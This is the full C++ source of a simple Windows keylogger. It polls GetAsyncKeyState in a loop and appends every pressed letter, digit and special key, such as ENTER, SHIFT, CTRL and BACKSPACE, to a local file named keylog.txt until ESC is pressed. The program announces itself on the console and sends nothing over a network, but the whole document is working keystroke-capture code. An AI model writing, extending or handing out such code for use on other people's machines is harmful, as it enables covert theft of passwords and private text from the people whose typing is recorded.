#include <iostream>
#include <fstream>
#include <Windows.h>
using namespace std;

void logKeystroke(int key, const string& file) {
    ofstream logFile(file, ios::app);

    if ((key > 64 && key < 91) || (key >= 48 && key <= 57)) {
        logFile << char(key); // log letters and numbers directly
    }
    else {
        switch (key) {
            case VK_SPACE:
                logFile << " ";
                break;
            case VK_RETURN:
                logFile << "[ENTER]\n";
                break;
            case VK_BACK:
                logFile << "[BACKSPACE]";
                break;
            case VK_TAB:
                logFile << "[TAB]";
                break;
            case VK_SHIFT:
            case VK_LSHIFT:
            case VK_RSHIFT:
                logFile << "[SHIFT]";
                break;
            case VK_CONTROL:
            case VK_LCONTROL:
            case VK_RCONTROL:
                logFile << "[CTRL]";
                break;
            case VK_ESCAPE:
                logFile << "[ESC]";
                break;
            default:
                logFile << "[" << key << "]";
        }
    }

    logFile.close();
}

int main() {
    string file = "keylog.txt";
    cout << "Logging started. Press ESC to stop.\n";

    while (true) {
        for (int key = 8; key <= 190; key++) {
            if (GetAsyncKeyState(key) & 0x8000) {
                logKeystroke(key, file);
                Sleep(10);
            }
        }

        // stop if ESC key is pressed
        if (GetAsyncKeyState(VK_ESCAPE) & 0x8000) {
            cout << "Logging stopped.\n";
            break;
        }
    }

    return 0;
}
